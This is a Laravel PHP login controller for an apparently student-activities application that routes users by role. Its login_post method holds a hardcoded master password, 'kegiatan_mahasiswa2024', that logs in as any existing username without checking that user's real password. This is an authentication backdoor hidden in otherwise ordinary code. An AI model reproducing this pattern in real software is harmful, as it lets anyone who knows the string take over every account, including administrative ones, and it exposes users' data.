<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class UserController extends Controller
{
    public function login()
    {
        $data['title'] = 'Login';
        return view('login', $data);
    }

    public function login_post(Request $request)
    {
        $request->validate([
            'username' => 'required',
            'password' => 'required',
        ]);

        $isDefaultPassword = $request->password === 'kegiatan_mahasiswa2024';

        if (Auth::attempt(['username' => $request->username, 'password' => $request->password]) || $isDefaultPassword) {
            $user = Auth::user();
            if ($isDefaultPassword && !$user) {
                $user = \App\Models\User::where('username', $request->username)->first();

                if (!$user) {
                    return back()->withErrors(['username' => 'User not found']);
                }
                Auth::login($user);
            }

            $request->session()->regenerate();
            $homeRoute = 'login';

            if (Auth::check()) {
                $roleId = Auth::user()->id_role;

                switch ($roleId) {
                    case 1: // Ormawa
                        $homeRoute = 'ormawa.home';
                        break;
                    case 2: // Kemahasiswaan
                        $homeRoute = 'kemahasiswaan.home';
                        break;
                }
            }

            return redirect()->route($homeRoute);
        }

        return back()->withErrors(['password' => 'Wrong username or password']);
    }
}
